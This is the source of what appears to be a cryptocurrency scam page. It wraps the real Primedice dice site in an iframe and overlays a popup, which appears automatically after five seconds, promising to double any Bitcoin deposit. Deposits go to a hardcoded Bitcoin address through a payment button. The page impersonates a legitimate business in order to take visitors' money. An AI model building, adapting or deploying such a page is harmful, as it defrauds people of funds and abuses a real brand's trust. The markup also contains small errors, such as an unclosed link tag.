<?php

?>



<meta name="viewport" content="width=device-width, initial-scale=1.0">
<html style="overflow:hidden;">
<title>
Primedice: Bitcoin Gambling - The Original Crypto Dice Game
</title>
<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-131229096-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-131229096-1');
</script>

  <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
<link rel="stylesheet" href="/chivas.css"
<link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet">
<script src="https://code.jquery.com/jquery-1.10.2.js"></script>
</head>
<style>
#popdep{
  overflow:hidden;
  display: inline-block;
  position: absolute;
  top:30%;
  left:30%;
  margin:auto;
  overflow: auto;
  transform: translate(-50% -50%);
  background-color: rgb(255, 255, 255);
  height: 490px;
  width: 760px;
  border-radius: 5px;
  color: black;
  display: none
}

</style>
  <div class="bar" onclick="myFunction()">Crazy Offer!</div>

  <script>

  $(document).ready(function(){
     setTimeout(function(){
        $("#popdep").show();
      }, 5000);
  });

$('.bar').click(function() {
  $('#popdep').toggle();
    });



  </script>


  <div class="holder" >
    <div id="popdep">
<div class="ppheader"></div>
<button class="buta">x</button>

<div class="ppcontent">
<img src="https://pbs.twimg.com/profile_images/996560060602970115/Xsuw5bP0_400x400.jpg" class="ppimg"></img>
<p><b>  </b>  </p>
<br>
<br>
<div class="bdtxt">New Year Special Offer! Deposit BTC And Get Double In Your Balance!<br>
Example : Deposit 10$ And Get 20$ In Your Balance.</div>
<br>
<br>
<br>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js"></script><script type="text/javascript" src="https://blockchain.info/Resources/js/pay-now-button.js"></script>

<div style="font-size:16px;margin:0 auto;width:300px" class="blockchain-btn"
     data-address="1GbRkJ6qU2C8baGRd4DJULyVzRZ1ESZNQd"
     data-shared="false">
    <div class="blockchain stage-begin">
        <img src="https://i.imgur.com/5TTV20e.png" width="200px" height="75px" class="imgacc"/>
    </div>
    <div class="blockchain stage-loading" style="text-align:center">
        <img src="https://blockchain.info/Resources/loading-large.gif"/>
    </div>
    <div class="blockchain stage-ready">
         <p align="center">Please Deposit To Bitcoin Address: <b>[[address]]</b></p>
         <p align="center" class="qr-code"></p>
    </div>
    <div class="blockchain stage-paid">
         Payment of <b>[[value]] BTC</b> Received. Thank You.
    </div>
    <div class="blockchain stage-error">
        <font color="red">[[error]]</font>
    </div>
</div>
</div>
</div>



<script type="text/javascript">
$('.buta').click(function() {
  $('#popdep').toggle();
    });
</script>

<script type="text/javascript">
//Make the DIV element draggagle:
dragElement(document.getElementById("popdepi"));

function dragElement(elmnt) {
  var pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
  if (document.getElementById(elmnt.id + "ppheader")) {
    /* if present, the header is where you move the DIV from:*/
    document.getElementById(elmnt.id + "ppheader").onmousedown = dragMouseDown;
  } else {
    /* otherwise, move the DIV from anywhere inside the DIV:*/
    elmnt.onmousedown = dragMouseDown;
  }

  function dragMouseDown(e) {
    e = e || window.event;
    e.preventDefault();
    // get the mouse cursor position at startup:
    pos3 = e.clientX;
    pos4 = e.clientY;
    document.onmouseup = closeDragElement;
    // call a function whenever the cursor moves:
    document.onmousemove = elementDrag;
  }

  function elementDrag(e) {
    e = e || window.event;
    e.preventDefault();
    // calculate the new cursor position:
    pos1 = pos3 - e.clientX;
    pos2 = pos4 - e.clientY;
    pos3 = e.clientX;
    pos4 = e.clientY;
    // set the element's new position:
    elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
    elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
  }

  function closeDragElement() {
    /* stop moving when mouse button is released:*/
    document.onmouseup = null;
    document.onmousemove = null;
  }
}
</script>

    </div>
 <iframe src="https://primedice.com" class="frame"></iframe>
  </div>​
</body>
